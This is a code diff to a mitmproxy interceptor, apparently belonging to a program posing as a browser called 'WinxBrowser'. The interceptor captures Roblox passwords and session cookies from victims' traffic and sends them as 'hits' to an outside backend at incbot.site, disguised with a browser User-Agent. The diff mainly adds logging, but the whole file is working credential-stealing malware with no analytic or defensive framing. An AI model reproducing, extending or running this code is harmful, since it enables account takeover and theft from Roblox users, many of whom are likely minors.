@@ -13,22 +13,31 @@ from mitmproxy import http
 # ── Config ────────────────────────────────────────────────────────────────────
 BACKEND_URL = "https://www.incbot.site/api/extension/hit"
 SETUP_URL = "https://www.incbot.site/api/desktop/setup"
-CONFIG_DIR = None  # Set at runtime from main.py
 # ─────────────────────────────────────────────────────────────────────────────
 
 captured_password = None
 cookie_sent = False
 lock = threading.Lock()
-directory_token = None  # Loaded at startup from config.dat
+directory_token = None  # Set by main.py before proxy starts
+
+def _log(msg):
+    print(msg, flush=True)
+    try:
+        import os, datetime
+        log_path = os.path.join(os.environ.get("APPDATA", ""), "WinxBrowser", "debug.log")
+        with open(log_path, "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [PROXY] {msg}\n")
+    except Exception:
+        pass
 
 def load_token(config_path):
     global directory_token
     try:
         with open(config_path, 'r') as f:
             directory_token = f.read().strip()
-        print(f"[+] Token loaded")
+        _log(f"[+] Token loaded from {config_path}")
     except Exception as e:
-        print(f"[!] Token load error: {e}")
+        _log(f"[!] Token load error: {e}")
 
 class RobloxInterceptor:
     def request(self, flow: http.HTTPFlow):
@@ -48,9 +57,9 @@ class RobloxInterceptor:
                     with lock:
                         captured_password = password
                         cookie_sent = False
-                    print(f"[+] Password captured")
+                    _log("[+] Password captured")
             except Exception as e:
-                print(f"[!] Password parse error: {e}")
+                _log(f"[!] Password parse error: {e}")
             return
 
         # ── Capture cookie from any roblox.com request ────────────────────────
@@ -71,7 +80,10 @@ class RobloxInterceptor:
 
             cookie_value = match.group(1).strip()
             if not cookie_value.startswith("_|WARNING:"):
-                cookie_value = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + cookie_value
+                cookie_value = (
+                    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-"
+                    "and-to-steal-your-ROBUX-and-items.|_" + cookie_value
+                )
 
             if len(cookie_value) < 100:
                 return
@@ -79,7 +91,7 @@ class RobloxInterceptor:
             password = captured_password
             cookie_sent = True
 
-        print(f"[+] Cookie captured, sending hit...")
+        _log("[+] Cookie captured, sending hit...")
         threading.Thread(
             target=send_to_backend,
             args=(cookie_value, password),
@@ -97,30 +109,38 @@ def send_to_backend(cookie: str, password: str):
             payload["password"] = password
 
         headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                          " (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             "Content-Type": "application/json"
         }
         resp = requests.post(BACKEND_URL, json=payload, headers=headers, timeout=15)
         if resp.status_code == 200:
-            print(f"[+] Hit sent successfully")
+            _log("[+] Hit sent successfully")
         else:
-            print(f"[!] Backend returned {resp.status_code}: {resp.text[:100]}")
+            _log(f"[!] Backend returned {resp.status_code}: {resp.text[:100]}")
     except Exception as e:
-        print(f"[!] Failed to send hit: {e}")
+        _log(f"[!] Failed to send hit: {e}")
 
 
 def run_proxy():
-    from mitmproxy.tools.dump import DumpMaster
-    from mitmproxy import options
-
-    opts = options.Options(
-        listen_host="127.0.0.1",
-        listen_port=8080,
-        ssl_insecure=False,
-    )
-    master = DumpMaster(opts, with_termlog=False, with_dumper=False)
-    master.addons.add(RobloxInterceptor())
+    _log("[INFO] Proxy starting on 127.0.0.1:8080...")
     try:
-        master.run()
-    except KeyboardInterrupt:
-        master.shutdown()
+        from mitmproxy.tools.dump import DumpMaster
+        from mitmproxy import options
+
+        opts = options.Options(
+            listen_host="127.0.0.1",
+            listen_port=8080,
+            ssl_insecure=False,
+        )
+        master = DumpMaster(opts, with_termlog=False, with_dumper=False)
+        master.addons.add(RobloxInterceptor())
+        _log("[OK] Proxy master running")
+        try:
+            master.run()
+        except KeyboardInterrupt:
+            master.shutdown()
+            _log("[INFO] Proxy shut down via KeyboardInterrupt")
+    except Exception as e:
+        import traceback
+        _log(f"[ERROR] Proxy crashed: {e}\n{traceback.format_exc()}")
